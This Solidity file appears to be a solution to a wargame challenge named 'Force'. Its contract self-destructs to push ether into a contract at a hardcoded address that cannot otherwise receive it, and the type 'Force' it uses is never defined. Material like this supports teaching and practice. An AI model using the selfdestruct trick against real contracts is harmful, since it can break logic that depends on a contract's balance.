//SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.4.22 <0.9.0;

contract HackForce{

  Force public originalContract = Force(0xD8C0448C8a841ebC572a5689DFE7027C4b7a5a91);

  function sendFunds() public payable returns(uint) {
    return address(this).balance;
  }

  function selfDestroy() public payable {
    address payable addr = payable(0xD8C0448C8a841ebC572a5689DFE7027C4b7a5a91);
    selfdestruct(addr);
  }
}
